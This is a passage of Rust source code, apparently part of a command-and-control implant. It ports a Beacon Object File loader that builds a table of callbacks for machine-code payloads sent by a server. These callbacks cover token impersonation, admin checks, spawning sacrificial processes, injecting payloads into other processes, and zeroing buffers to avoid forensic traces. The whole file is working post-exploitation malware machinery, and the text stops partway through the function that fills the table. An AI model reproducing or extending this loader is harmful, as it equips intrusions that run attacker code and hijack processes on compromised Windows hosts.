//! 移植自 boff.cpp —— Beacon 对象文件（BOFF/COFF）加载器。
//!
//! BOFF 是服务器以下列格式下发的 PE/COFF 对象：
//! `[4b entry][code][rdata][data][relocs][args]`。我们对照 `BOFF_FUNCTIONS`
//! 表（以及任何动态解析的导入）修正它的重定位，把代码复制到可执行的补丁区，
//! 然后调用入口点。`BOFF_FUNCTIONS` 的布局必须与 C 结构体完全一致：
//! 载荷是机器码，按 x64 C 调用约定通过这些槽位调用。
//! Port of boff.cpp — the Beacon Object File (BOFF/COFF) loader.
//!
//! A BOFF is a PE/COFF object shipped by the server as
//! `[4b entry][code][rdata][data][relocs][args]`. We fix up its
//! relocations against the `BOFF_FUNCTIONS` table (and any dynamically
//! resolved imports), copy the code to an executable patch, and call the
//! entry point. The `BOFF_FUNCTIONS` layout must match the C struct
//! exactly: the payload is machine code that calls through these slots
//! using the x64 C calling convention.

use core::ffi::c_void;
use core::mem::size_of;
use core::ptr;
use core::slice;

use windows_sys::Win32::Foundation::FreeLibrary;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
};
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;

use crate::beacon::SETTING_PROCINJ_PERMS_I;
use crate::callback::{command_shell_callback, post_error, post_error_d, post_error_dd, post_error_na};
use crate::parse::DataP;
use crate::settings::setting_short;

// COFF 重定位类型（coff.h + AMD64 重定位）。这些镜像了 C 的 #define；
// 少数只在范围检查中被比较，与 C 中一样。
/* COFF relocation types (coff.h + AMD64 relocations). These mirror the
 * C #defines; a few are only compared in a range check, like in the C. */
#[allow(dead_code)]
const RELOC_ENDTABLE: i16 = 0;
#[allow(dead_code)]
const RELOC_ADDR32: i16 = 6;
#[allow(dead_code)]
const RELOC_REL32: i16 = 20;
const RELOC64_REL32_0: i16 = 4;
#[allow(dead_code)]
const RELOC64_REL32_1: i16 = 5;
#[allow(dead_code)]
const RELOC64_REL32_2: i16 = 6;
#[allow(dead_code)]
const RELOC64_REL32_3: i16 = 7;
#[allow(dead_code)]
const RELOC64_REL32_4: i16 = 8;
const RELOC64_REL32_5: i16 = 9;

// 服务器用来标记每条重定位目标的“符号”。
/* the "symbols" the server uses to tag each relocation with its target. */
const SYMBOL_RDATA: i16 = 1024;
const SYMBOL_DATA: i16 = 1025;
const SYMBOL_TEXT: i16 = 1026;
const SYMBOL_DYNAMICF: i16 = 1027;
const SYMBOL_END: i16 = 1028;

/// 来自重定位流的一条重定位项（boff.cpp 中的 `OBJ_RELOC`）。
/// One relocation entry from the reloc stream (`OBJ_RELOC` in boff.cpp).
#[repr(C)]
#[derive(Clone, Copy, Debug, Default)]
pub struct ObjReloc {
    pub rtype: i16,
    pub symbol: i16,
    pub offset: i32,
    pub offset_in_section: i32,
}

impl ObjReloc {
    /// 从流中复制一条重定位项。C 代码用 memcpy 把结构体从缓冲区拷出来，
    /// 因此这里是主机字节序。
    /// Copy a relocation entry out of the stream. The C code memcpy's the
    /// struct out of the buffer, so this is host byte order.
    fn from_bytes(b: &[u8]) -> ObjReloc {
        ObjReloc {
            rtype: i16::from_ne_bytes([b[0], b[1]]),
            symbol: i16::from_ne_bytes([b[2], b[3]]),
            offset: i32::from_ne_bytes([b[4], b[5], b[6], b[7]]),
            offset_in_section: i32::from_ne_bytes([b[8], b[9], b[10], b[11]]),
        }
    }
}

/// 来自 boff.cpp 的 `BOFF_FUNCTIONS`。每个字段都是函数指针；
/// 结构体必须与 C 定义逐字节一致（31 个命名槽位后跟 `other[32]`），
/// 因为 BOFF 载荷会直接索引它。
/// `BOFF_FUNCTIONS` from boff.cpp. Every field is a function pointer; the
/// struct must stay byte-identical with the C definition (31 named slots
/// followed by `other[32]`), because BOFF payloads index it directly.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct BoffFunctions {
    // 解析 Win32 模块的 API。
    /* APIs to resolve Win32 modules */
    load_library_a: usize,
    free_library: usize,
    get_proc_address: usize,
    get_module_handle_a: usize,

    // 数据解析器 API。
    /* data parser API */
    beacon_data_parse: usize,
    beacon_data_ptr: usize,
    beacon_data_int: usize,
    beacon_data_short: usize,
    beacon_data_length: usize,
    beacon_data_extract: usize,

    // 字符串构建器 API。
    /* string builder API */
    beacon_format_alloc: usize,
    beacon_format_reset: usize,
    beacon_format_append: usize,
    beacon_format_printf: usize,
    beacon_format_tostring: usize,
    beacon_format_free: usize,
    beacon_format_int: usize,

    // 输出函数。
    /* output functions */
    beacon_output: usize,
    beacon_printf: usize,
    beacon_error_d: usize,
    beacon_error_dd: usize,
    beacon_error_na: usize,

    // 令牌函数。
    /* token functions */
    beacon_use_token: usize,
    beacon_revert_token: usize,
    beacon_is_admin: usize,

    // 生成与注入。
    /* spawn and inject */
    beacon_get_spawn_to: usize,
    beacon_inject_process: usize,
    beacon_inject_temporary_process: usize,
    beacon_spawn_temporary_process: usize,
    beacon_cleanup_process: usize,

    // 工具函数。
    /* utility functions */
    to_wide_char: usize,

    // 我们的其他指针。
    /* our other pointers */
    pub other: [usize; 32],
}

impl Default for BoffFunctions {
    fn default() -> Self {
        BoffFunctions {
            load_library_a: 0,
            free_library: 0,
            get_proc_address: 0,
            get_module_handle_a: 0,
            beacon_data_parse: 0,
            beacon_data_ptr: 0,
            beacon_data_int: 0,
            beacon_data_short: 0,
            beacon_data_length: 0,
            beacon_data_extract: 0,
            beacon_format_alloc: 0,
            beacon_format_reset: 0,
            beacon_format_append: 0,
            beacon_format_printf: 0,
            beacon_format_tostring: 0,
            beacon_format_free: 0,
            beacon_format_int: 0,
            beacon_output: 0,
            beacon_printf: 0,
            beacon_error_d: 0,
            beacon_error_dd: 0,
            beacon_error_na: 0,
            beacon_use_token: 0,
            beacon_revert_token: 0,
            beacon_is_admin: 0,
            beacon_get_spawn_to: 0,
            beacon_inject_process: 0,
            beacon_inject_temporary_process: 0,
            beacon_spawn_temporary_process: 0,
            beacon_cleanup_process: 0,
            to_wide_char: 0,
            other: [0; 32],
        }
    }
}

/// C 的 `datap` 结构体（parse.h）。BOFF 载荷自己分配这个结构体，
/// 并在其上调用我们的数据解析器 shim，因此布局必须匹配。
/// The C `datap` struct (parse.h). BOFF payloads allocate this themselves
/// and call our data-parser shims on it, so the layout must match.
#[repr(C)]
struct RawDatap {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

/// C 的 `formatp` 结构体（bformat.h）。
/// The C `formatp` struct (bformat.h).
#[repr(C)]
struct RawFormatp {
    original: *mut u8,
    self_: *mut u8,
    length: i32,
    size: i32,
}

/// C 的 `datap_buffer` 结构体（parse.h）。即使我们的 shim 返回原始指针，
/// 也保留它以与 C 头文件保持一致。
/// The C `datap_buffer` struct (parse.h). Kept for fidelity with the C
/// header even though our shims return raw pointers.
#[allow(dead_code)]
#[repr(C)]
struct RawDatapBuffer {
    buffer: *mut u8,
    length: i32,
}

/// 以 NUL 结尾的 C 字符串的长度。
/// Length of a NUL-terminated C string.
unsafe fn cstr_len(ptr: *const u8) -> usize {
    let mut n = 0usize;
    while *ptr.add(n) != 0 {
        n += 1;
    }
    n
}

/// 以字节切片形式借用 NUL 结尾的 C 字符串（不含 NUL）。
/// Borrow a NUL-terminated C string as a byte slice (no NUL).
pub(crate) unsafe fn cstr_slice(ptr: *const u8) -> &'static [u8] {
    slice::from_raw_parts(ptr, cstr_len(ptr))
}

/* ------------------------------------------------------------------ */
// 两个变参槽位（BeaconPrintf / BeaconFormatPrintf）需要一个
// vsprintf 等价物。真正的 BOF 只输出常见的说明符，因此我们自己格式化；
// 变参到达下面 shim 的固定额外参数中（正好是 x64 变参落位的位置）。
/* the two variadic slots (BeaconPrintf / BeaconFormatPrintf) need a   */
/* vsprintf-equivalent. Real BOFs only emit the common specifiers, so  */
/* we format them ourselves; the varargs arrive in the fixed extra     */
/* parameters of the shims below (exactly where the x64 varargs land). */
/* ------------------------------------------------------------------ */

const FLAG_LEFT: u8 = 0x01;
const FLAG_PLUS: u8 = 0x02;
const FLAG_SPACE: u8 = 0x04;
const FLAG_ALT: u8 = 0x08;
const FLAG_ZERO: u8 = 0x10;

fn next_arg(ai: &mut usize, args: &[u64]) -> u64 {
    let v = *args.get(*ai).unwrap_or(&0);
    *ai += 1;
    v
}

fn read_cstr(ptr: u64) -> Vec<u8> {
    if ptr == 0 {
        return b"(null)".to_vec();
    }
    let mut v = Vec::new();
    let mut p = ptr as *const u8;
    unsafe {
        loop {
            let b = *p;
            if b == 0 {
                break;
            }
            v.push(b);
            p = p.add(1);
        }
    }
    v
}

fn read_wide_cstr(ptr: u64) -> Vec<u8> {
    if ptr == 0 {
        return b"(null)".to_vec();
    }
    let mut v: Vec<u16> = Vec::new();
    let mut p = ptr as *const u16;
    unsafe {
        loop {
            let c = *p;
            if c == 0 {
                break;
            }
            v.push(c);
            p = p.add(1);
        }
    }
    String::from_utf16_lossy(&v).into_bytes()
}

fn pad_and_push(out: &mut Vec<u8>, s: &[u8], flags: u8, width: usize) {
    if s.len() >= width {
        out.extend_from_slice(s);
        return;
    }
    let pad = width - s.len();
    if flags & FLAG_LEFT != 0 {
        out.extend_from_slice(s);
        out.extend(core::iter::repeat(b' ').take(pad));
    } else {
        out.extend(core::iter::repeat(b' ').take(pad));
        out.extend_from_slice(s);
    }
}

fn push_int(
    out: &mut Vec<u8>,
    v: u64,
    base: u32,
    upper: bool,
    flags: u8,
    width: usize,
    precision: Option<usize>,
) {
    let negative = (v as i64) < 0;
    let mag = if negative { (v as i64).unsigned_abs() } else { v };

    // 数字（从最低有效位开始，然后反转）。
    // digits (least significant first, then reversed)
    let mut digits: Vec<u8> = Vec::new();
    let mut m = mag;
    if m == 0 {
        digits.push(b'0');
    }
    while m > 0 {
        let d = (m % base as u64) as u8;
        digits.push(if d < 10 {
            b'0' + d
        } else if upper {
            b'A' + (d - 10)
        } else {
            b'a' + (d - 10)
        });
        m /= base as u64;
    }
    digits.reverse();

    // 精度 = 最小数字位数。
    // precision = minimum number of digits
    if let Some(p) = precision {
        if digits.len() < p {
            let mut z = vec![b'0'; p - digits.len()];
            z.append(&mut digits);
            digits = z;
        }
    }

    // 符号 / 前缀。
    // sign / prefix
    let mut prefix: Vec<u8> = Vec::new();
    if negative {
        prefix.push(b'-');
    } else if flags & FLAG_PLUS != 0 {
        prefix.push(b'+');
    } else if flags & FLAG_SPACE != 0 {
        prefix.push(b' ');
    }
    if flags & FLAG_ALT != 0 && base == 16 && mag != 0 {
        if upper {
            prefix.extend_from_slice(b"0X");
        } else {
            prefix.extend_from_slice(b"0x");
        }
    }

    let zero_pad = flags & FLAG_ZERO != 0 && flags & FLAG_LEFT == 0 && precision.is_none();
    let total = prefix.len() + digits.len();

    if !zero_pad && flags & FLAG_LEFT == 0 && width > total {
        out.extend(core::iter::repeat(b' ').take(width - total));
    }
    out.extend_from_slice(&prefix);
    if zero_pad && width > total {
        out.extend(core::iter::repeat(b'0').take(width - total));
    }
    out.extend_from_slice(&digits);
    if flags & FLAG_LEFT != 0 && width > total {
        out.extend(core::iter::repeat(b' ').take(width - total));
    }
}

/// 供 BeaconPrintf / BeaconFormatPrintf shim 使用的最小化 `vsprintf` 风格
/// 格式化器。支持 `%[flags][width][.precision][length]d i u o x X c s p S`
/// 和 `%%`。遇到我们不支持的说明符时返回 `None`（调用方随后跳过输出，
/// 就像 `vsprintf_s` 失败一样）。
/// Minimal `vsprintf`-style formatter used by the BeaconPrintf /
/// BeaconFormatPrintf shims. Supports `%[flags][width][.precision]
/// [length]d i u o x X c s p S` and `%%`. Returns `None` on a specifier
/// we do not support (the caller then skips the output, like a failed
/// `vsprintf_s`).
pub(crate) fn format_string(fmt: &[u8], args: &[u64]) -> Option<Vec<u8>> {
    let mut out: Vec<u8> = Vec::new();
    let mut ai = 0usize;
    let mut i = 0usize;

    while i < fmt.len() {
        let c = fmt[i];
        if c != b'%' {
            out.push(c);
            i += 1;
            continue;
        }
        i += 1;
        if i >= fmt.len() {
            return None;
        }
        if fmt[i] == b'%' {
            out.push(b'%');
            i += 1;
            continue;
        }

        // 标志。
        // flags
        let mut flags = 0u8;
        while i < fmt.len() && matches!(fmt[i], b'-' | b'+' | b' ' | b'#' | b'0') {
            flags |= match fmt[i] {
                b'-' => FLAG_LEFT,
                b'+' => FLAG_PLUS,
                b' ' => FLAG_SPACE,
                b'#' => FLAG_ALT,
                b'0' => FLAG_ZERO,
                _ => 0,
            };
            i += 1;
        }
        // 宽度。
        // width
        let mut width = 0usize;
        while i < fmt.len() && fmt[i].is_ascii_digit() {
            width = width
                .saturating_mul(10)
                .saturating_add((fmt[i] - b'0') as usize);
            i += 1;
        }
        // 精度。
        // precision
        let mut precision: Option<usize> = None;
        if i < fmt.len() && fmt[i] == b'.' {
            i += 1;
            let mut p = 0usize;
            while i < fmt.len() && fmt[i].is_ascii_digit() {
                p = p.saturating_mul(10).saturating_add((fmt[i] - b'0') as usize);
                i += 1;
            }
            precision = Some(p);
        }
        // 长度修饰符：0=none 1=hh 2=h 3=l 4=ll 5=z 6=j 7=t。
        // length modifier: 0=none 1=hh 2=h 3=l 4=ll 5=z 6=j 7=t
        let mut lenmod = 0u8;
        if i < fmt.len() {
            match fmt[i] {
                b'h' => {
                    if i + 1 < fmt.len() && fmt[i + 1] == b'h' {
                        lenmod = 1;
                        i += 2;
                    } else {
                        lenmod = 2;
                        i += 1;
                    }
                }
                b'l' => {
                    if i + 1 < fmt.len() && fmt[i + 1] == b'l' {
                        lenmod = 4;
                        i += 2;
                    } else {
                        lenmod = 3;
                        i += 1;
                    }
                }
                b'z' => {
                    lenmod = 5;
                    i += 1;
                }
                b'j' => {
                    lenmod = 6;
                    i += 1;
                }
                b't' => {
                    lenmod = 7;
                    i += 1;
                }
                _ => {}
            }
        }
        if i >= fmt.len() {
            return None;
        }
        let conv = fmt[i];
        i += 1;

        match conv {
            b'd' | b'i' => {
                let raw = next_arg(&mut ai, args);
                let v: i64 = match lenmod {
                    1 => (raw as u8) as i8 as i64,
                    2 => (raw as u16) as i16 as i64,
                    3 | 5 | 6 | 7 => (raw as u32) as i32 as i64, // long 在 Windows 上是 32 位
                                                                  // long is 32-bit on Windows
                    4 => raw as i64,
                    _ => (raw as u32) as i32 as i64,
                };
                push_int(&mut out, v as u64, 10, false, flags, width, precision);
            }
            b'u' | b'o' | b'x' | b'X' => {
                let raw = next_arg(&mut ai, args);
                let v: u64 = match lenmod {
                    1 => (raw as u8) as u64,
                    2 => (raw as u16) as u64,
                    3 | 5 | 7 => (raw as u32) as u64,
                    4 | 6 => raw,
                    _ => (raw as u32) as u64,
                };
                let base = if conv == b'o' {
                    8
                } else if conv == b'x' || conv == b'X' {
                    16
                } else {
                    10
                };
                push_int(&mut out, v, base, conv == b'X', flags, width, precision);
            }
            b'c' => {
                let raw = next_arg(&mut ai, args);
                if lenmod == 3 {
                    let ch = char::from_u32(raw as u32).unwrap_or('\u{FFFD}');
                    let mut buf = [0u8; 4];
                    out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                } else {
                    out.push((raw & 0xff) as u8);
                }
            }
            b's' | b'S' => {
                let raw = next_arg(&mut ai, args);
                let wide = conv == b'S' || lenmod == 3;
                let s = if wide {
                    read_wide_cstr(raw)
                } else {
                    read_cstr(raw)
                };
                let s = match precision {
                    Some(p) => s.iter().take(p).copied().collect::<Vec<u8>>(),
                    None => s,
                };
                pad_and_push(&mut out, &s, flags, width);
            }
            b'p' => {
                let raw = next_arg(&mut ai, args);
                let w = core::mem::size_of::<usize>() * 2;
                let digits = format!("{:0width$x}", raw, width = w);
                pad_and_push(&mut out, digits.as_bytes(), flags, w.max(width));
            }
            _ => return None,
        }
    }
    Some(out)
}

/* ------------------------------------------------------------------ */
// shim：BOFF_FUNCTIONS 表指向它们。全部为 `extern "C"`，
// 以便机器码可以用 x64 C 调用约定调用它们。
/* shims: the BOFF_FUNCTIONS table points at these. All are `extern     */
/* "C"` so machine code can call them with the x64 C calling convention.*/
/* ------------------------------------------------------------------ */

/// data_init(datap *, char * buffer, int size) 的 shim。
/// data_init(datap *, char * buffer, int size)
extern "C" fn data_init_shim(temp: *mut RawDatap, buffer: *mut u8, size: i32) {
    unsafe {
        (*temp).original = buffer;
        (*temp).buffer = buffer;
        (*temp).length = size;
        (*temp).size = size;
    }
}

/// data_ptr(datap *, int length) 的 shim。
/// data_ptr(datap *, int length)
extern "C" fn data_ptr_shim(d: *mut RawDatap, length: i32) -> *mut u8 {
    unsafe {
        if (*d).length < length {
            return ptr::null_mut();
        }
        let p = (*d).buffer;
        (*d).buffer = (*d).buffer.add(length as usize);
        (*d).length -= length;
        p
    }
}

/// data_int(datap *) —— 网络字节序。
/// data_int(datap *) — network order
extern "C" fn data_int_shim(d: *mut RawDatap) -> u32 {
    unsafe {
        if (*d).length < 4 {
            return 0;
        }
        let mut b = [0u8; 4];
        ptr::copy_nonoverlapping((*d).buffer, b.as_mut_ptr(), 4);
        (*d).buffer = (*d).buffer.add(4);
        (*d).length -= 4;
        u32::from_be_bytes(b)
    }
}

/// data_short(datap *) —— 网络字节序。
/// data_short(datap *) — network order
extern "C" fn data_short_shim(d: *mut RawDatap) -> u16 {
    unsafe {
        if (*d).length < 2 {
            return 0;
        }
        let mut b = [0u8; 2];
        ptr::copy_nonoverlapping((*d).buffer, b.as_mut_ptr(), 2);
        (*d).buffer = (*d).buffer.add(2);
        (*d).length -= 2;
        u16::from_be_bytes(b)
    }
}

/// data_length(datap *) 的 shim。
/// data_length(datap *)
extern "C" fn data_length_shim(d: *mut RawDatap) -> i32 {
    unsafe { (*d).length }
}

/// data_ptr_extract(datap *, int * size) —— 这是表中 BeaconDataExtract
/// 槽位指向的函数。
/// data_ptr_extract(datap *, int * size) — this is what the table's
/// BeaconDataExtract slot points at.
extern "C" fn data_ptr_extract_shim(d: *mut RawDatap, size: *mut i32) -> *mut u8 {
    let length = data_int_shim(d);
    let buffer = data_ptr_shim(d, length as i32);
    if !size.is_null() {
        unsafe { *size = length as i32 };
    }
    if length == 0 {
        return ptr::null_mut();
    }
    buffer
}

/// bformat_init(formatp *, int maxsz) 的 shim。
/// bformat_init(formatp *, int maxsz)
extern "C" fn bformat_init_shim(buffer: *mut RawFormatp, maxsz: i32) {
    let mut data = vec![0u8; maxsz as usize];
    let p = data.as_mut_ptr();
    core::mem::forget(data); // 所有权由 bformat_free_shim 再次接管
                             // owned again by bformat_free_shim
    unsafe {
        (*buffer).original = p;
        (*buffer).self_ = p;
        (*buffer).length = 0;
        (*buffer).size = maxsz;
    }
}

/// bformat_reset(formatp *) 的 shim。
/// bformat_reset(formatp *)
extern "C" fn bformat_reset_shim(buffer: *mut RawFormatp) {
    unsafe {
        (*buffer).self_ = (*buffer).original;
        (*buffer).length = 0;
        // C 代码用（现在为零的）长度做 memset：这是空操作。
        // the C code memsets with the (now zero) length: a no-op
        ptr::write_bytes((*buffer).original, 0, (*buffer).length as usize);
    }
}

/// bformat_int(formatp *, int value) —— htonl + 复制。
/// bformat_int(formatp *, int value) — htonl + copy
extern "C" fn bformat_int_shim(buffer: *mut RawFormatp, value: i32) {
    let be = value.to_be_bytes();
    bformat_copy_shim(buffer, be.as_ptr() as *mut u8, 4);
}

/// bformat_copy(formatp *, char * src, int length) 的 shim。
/// bformat_copy(formatp *, char * src, int length)
extern "C" fn bformat_copy_shim(buffer: *mut RawFormatp, src: *mut u8, length: i32) {
    unsafe {
        if length >= ((*buffer).size - (*buffer).length) || length == 0 {
            return;
        }
        if src.is_null() {
            return;
        }
        ptr::copy_nonoverlapping(src, (*buffer).self_, length as usize);
        (*buffer).self_ = (*buffer).self_.add(length as usize);
        (*buffer).length += length;
    }
}

/// bformat_printf(formatp *, char * fmt, ...) 的 shim。
/// bformat_printf(formatp *, char * fmt, ...)
extern "C" fn bformat_printf_shim(
    buffer: *mut RawFormatp,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
) {
    if fmt.is_null() {
        return;
    }
    let fmt_slice = unsafe { cstr_slice(fmt) };
    let args = [a1, a2, a3, a4, a5, a6, a7, a8];
    let Some(out) = format_string(fmt_slice, &args) else { return };
    let est = out.len() as i32;
    if est <= 0 {
        return;
    }
    unsafe {
        let remaining = (*buffer).size - (*buffer).length;
        if est >= remaining {
            return;
        }
        ptr::copy_nonoverlapping(out.as_ptr(), (*buffer).self_, out.len());
        // vsprintf_s 以 NUL 结尾；长度不包含该 NUL。
        // vsprintf_s NUL-terminates; the length does not include the NUL
        (*buffer).self_.add(out.len()).write(0);
        (*buffer).self_ = (*buffer).self_.add(out.len());
        (*buffer).length += est;
    }
}

/// bformat_tostring(formatp *, int * size) 的 shim。
/// bformat_tostring(formatp *, int * size)
extern "C" fn bformat_tostring_shim(buffer: *mut RawFormatp, size: *mut i32) -> *mut u8 {
    unsafe {
        let len = (*buffer).length;
        if !size.is_null() {
            *size = len;
        }
        if size.is_null() {
            return ptr::null_mut();
        }
        (*buffer).original
    }
}

/// bformat_free(formatp *) 的 shim。
/// bformat_free(formatp *)
extern "C" fn bformat_free_shim(buffer: *mut RawFormatp) {
    unsafe {
        if (*buffer).original.is_null() {
            return;
        }
        // 取证级清理，然后把分配还给系统。
        // forensically clean, then give the allocation back
        ptr::write_bytes((*buffer).original, 0, (*buffer).size as usize);
        let size = (*buffer).size as usize;
        let v = Vec::from_raw_parts((*buffer).original, size, size);
        drop(v);
    }
}

/// BeaconOutput —— postmsg(int type, char * msg, int len)。
/// BeaconOutput — postmsg(int type, char * msg, int len)
pub(crate) extern "C" fn postmsg_shim(type_: i32, msg: *mut u8, len: i32) {
    let data: &[u8] = if msg.is_null() || len <= 0 {
        &[]
    } else {
        unsafe { slice::from_raw_parts(msg, len as usize) }
    };
    command_shell_callback(data, len, type_);
}

/// BeaconPrintf —— postmsgf(int type, char * fmt, ...)。
/// BeaconPrintf — postmsgf(int type, char * fmt, ...)
extern "C" fn postmsgf_shim(
    type_: i32,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
) {
    if fmt.is_null() {
        return;
    }
    let fmt_slice = unsafe { cstr_slice(fmt) };
    let args = [a1, a2, a3, a4, a5, a6, a7, a8];
    if let Some(out) = format_string(fmt_slice, &args) {
        if out.is_empty() {
            return;
        }
        command_shell_callback(&out, out.len() as i32, type_);
    }
}

/// BeaconErrorD —— post_error_d(int error, int arg)。
/// BeaconErrorD — post_error_d(int error, int arg)
extern "C" fn post_error_d_shim(error: i32, arg: i32) {
    post_error_d(error, arg);
}

/// BeaconErrorDD —— post_error_dd(int error, int arg, int arg2)。
/// BeaconErrorDD — post_error_dd(int error, int arg, int arg2)
extern "C" fn post_error_dd_shim(error: i32, arg: i32, arg2: i32) {
    post_error_dd(error, arg, arg2);
}

/// BeaconErrorNA —— post_error_na(int error)。
/// BeaconErrorNA — post_error_na(int error)
extern "C" fn post_error_na_shim(error: i32) {
    post_error_na(error);
}

/// BeaconUseToken —— use_token_a(HANDLE token)。
/// BeaconUseToken — use_token_a(HANDLE token)
extern "C" fn use_token_a_shim(token: *mut c_void) -> i32 {
    let mut mem = [0u8; 256];
    let result = crate::tokens::use_token(token as isize, &mut mem, 256);
    mem.fill(0);
    result as i32
}

/// BeaconRevertToken —— command_rev2self()。
/// BeaconRevertToken — command_rev2self()
extern "C" fn command_rev2self_shim() {
    crate::tokens::command_rev2self();
}

/// BeaconIsAdmin —— is_admin()。
/// BeaconIsAdmin — is_admin()
extern "C" fn is_admin_shim() -> i32 {
    crate::tokens::is_admin() as i32
}

/// BeaconGetSpawnTo —— getspawnproc(BOOL x86, char * buff, int len)。
/// BeaconGetSpawnTo — getspawnproc(BOOL x86, char * buff, int len)
extern "C" fn getspawnproc_shim(x86: i32, buff: *mut u8, len: i32) {
    let mut proc = [0u8; 256];
    crate::process::spawn_populate(x86 != 0, &mut proc);
    let copy = if len < 256 { len as usize } else { 256 };
    if copy > 0 && !buff.is_null() {
        unsafe { ptr::copy_nonoverlapping(proc.as_ptr(), buff, copy) };
    }
}

fn payload_slice(p: *mut u8, len: i32) -> &'static [u8] {
    if p.is_null() || len <= 0 {
        &[]
    } else {
        unsafe { slice::from_raw_parts(p, len as usize) }
    }
}

/// BeaconInjectProcess —— inject_explicit_process(HANDLE, int pid, ...)。
/// BeaconInjectProcess — inject_explicit_process(HANDLE, int pid, ...)
extern "C" fn inject_explicit_process_shim(
    h_process: *mut c_void,
    pid: i32,
    payload: *mut u8,
    p_len: i32,
    p_offset: i32,
    arg: *mut u8,
    a_len: i32,
) {
    crate::inject::inject_process_logic(
        ptr::null_mut(),
        h_process as isize,
        pid as u32,
        payload_slice(payload, p_len),
        p_len as usize,
        p_offset,
        arg as *mut c_void,
        a_len as usize,
    );
}

/// BeaconInjectTemporaryProcess —— inject_temp_process(PROCESS_INFORMATION *, ...)。
/// BeaconInjectTemporaryProcess — inject_temp_process(PROCESS_INFORMATION *, ...)
extern "C" fn inject_temp_process_shim(
    pi: *mut PROCESS_INFORMATION,
    payload: *mut u8,
    plen: i32,
    off: i32,
    arg: *mut u8,
    alen: i32,
) {
    if pi.is_null() {
        return;
    }
    unsafe {
        crate::inject::inject_process_logic(
            pi as *mut c_void,
            (*pi).hProcess as isize,
            (*pi).dwProcessId,
            payload_slice(payload, plen),
            plen as usize,
            off,
            arg as *mut c_void,
            alen as usize,
        );
    }
}

/// BeaconSpawnTemporaryProcess —— spawn_patsy(BOOL x86, BOOL ignoreToken, ...)。
/// BeaconSpawnTemporaryProcess — spawn_patsy(BOOL x86, BOOL ignoreToken, ...)
extern "C" fn spawn_patsy_shim(
    x86: i32,
    ignore_token: i32,
    si: *mut c_void,
    pi: *mut c_void,
) -> i32 {
    crate::process::spawn_patsy(x86 != 0, ignore_token != 0, si, pi) as i32
}

/// BeaconCleanupProcess —— cleanupProcess(PROCESS_INFORMATION *)。
/// BeaconCleanupProcess — cleanupProcess(PROCESS_INFORMATION *)
extern "C" fn cleanup_process_shim(pi: *mut PROCESS_INFORMATION) {
    if !pi.is_null() {
        unsafe { crate::jobs::cleanup_process(&*pi) };
    }
}

/// toWideChar(char * src, wchar_t * dst, int max) 的 shim。
/// toWideChar(char * src, wchar_t * dst, int max)
extern "C" fn to_wide_char_shim(src: *mut u8, dst: *mut u16, max: i32) -> i32 {
    if src.is_null() || dst.is_null() || max <= 0 {
        return 0;
    }
    let slen = unsafe { cstr_len(src) };
    let src_slice = unsafe { slice::from_raw_parts(src, slen) };
    let dst_slice = unsafe { slice::from_raw_parts_mut(dst, max as usize) };
    crate::commands::to_wide_char(src_slice, dst_slice, max as usize) as i32
}

/* ------------------------------------------------------------------ */

/// 为动态解析的函数寻找槽位（boff.cpp 中的 `function_slot`）。
/// 返回指向槽位的指针；如果 `other[]` 已满则返回 NULL。
/// Find a slot for a dynamically resolved function (`function_slot` in
/// boff.cpp). Returns a pointer to the slot, or NULL if `other[]` is full.
pub fn function_slot(f: &mut BoffFunctions, ptr: usize) -> *mut usize {
    // 尝试找到我们的指针并返回指向它的指针！
    /* try and find our pointer and return a pointer to it! */
    for x in 0..32 {
        if f.other[x] == ptr {
            return &mut f.other[x] as *mut usize;
        }
    }
    // 好，找一个 NULL 指针并返回指向它的指针。
    /* OK, find a NULL pointer and return a pointer to that */
    for x in 0..32 {
        if f.other[x] == 0 {
            f.other[x] = ptr;
            return &mut f.other[x] as *mut usize;
        }
    }
    ptr::null_mut()
}

/// 填充固定的 API 槽位（boff.cpp 中的 `setup_functions`）。
/// Fill in the fixed API slots (`setup_functions` in boff.cpp).
pub fn setup_functions(f: &mut BoffFunctions) {
    // 请清除所有这些指针。
    /* clear all of these pointers, please */
    *f = BoffFunctions::default();

    // 设置一些我们的固定 API。
    /* setup some of our fixed APIs */
    f.load_library_a = LoadLibraryA as *const () as usize;
    f.free_library = FreeLibrary as *const () as usize;
    f.get_proc_address = GetProcAddress as *const () as usize;
    f.get_module_handle_a = GetModuleHandleA as *const () as usize;

    // 数据解析器 API。
    /* data parser API */
    f.beacon_data_parse = data_init_shim as *const () as usize;
    f.beacon_data_ptr = data_ptr_shim as *const () as usize;
    f.beacon_data_int = data_int_shim as *const () as usize;
    f.beacon_data_short = data_short_shim as *const () as usize;
    f.beacon_data_length = data_length_shim as *const () as usize;
    f.beacon_data_extract = data_ptr_extract_shim as *const () as usize;

    // beacon 格式化 API。
    /* beacon format API */
    f.beacon_format_alloc = bformat_init_shim as *const () as usize;
    f.beacon_format_reset = bformat_reset_shim as *const () as usize;
    f.beacon_format_printf = bformat_printf_shim as *const () as usize;
    f.beacon_format_append = bformat_copy_shim as *const () as usize;
    f.beacon_format_free = bformat_free_shim as *const () as usize;
    f.beacon_format_tostring = bformat_tostring_shim as *const () as usize;
    f.beacon_format_int = bformat_int_shim as *const () as usize;

    // 我们的输出函数。
    /* our output functions */
    f.beacon_output = postmsg_shim as *const () as usize;
    f.beacon_printf = postmsgf_shim as *const () as usize;
    f.beacon_error_d = post_error_d_shim as *const () as usize;
    f.beacon_error_dd = post_error_dd_shim as *const () as usize;
    f.beacon_error_na = post_error_na_shim as *const () as usize;

    // 令牌 API。
    /* token API */
    f.beacon_use_token = use_token_a_shim as *const () as usize;
    f.beacon_is_admin = is_admin_shim as *const () as usize;
    f.beacon_revert_token = command_rev2self_shim as *const () as usize;

    // 生成与注入 API。
    /* spawn and inject APIs */
    f.beacon_get_spawn_to = getspawnproc_shim as *const () as usize;
    f.beacon_cleanup_process = cleanup_process_shim as *const () as usize;
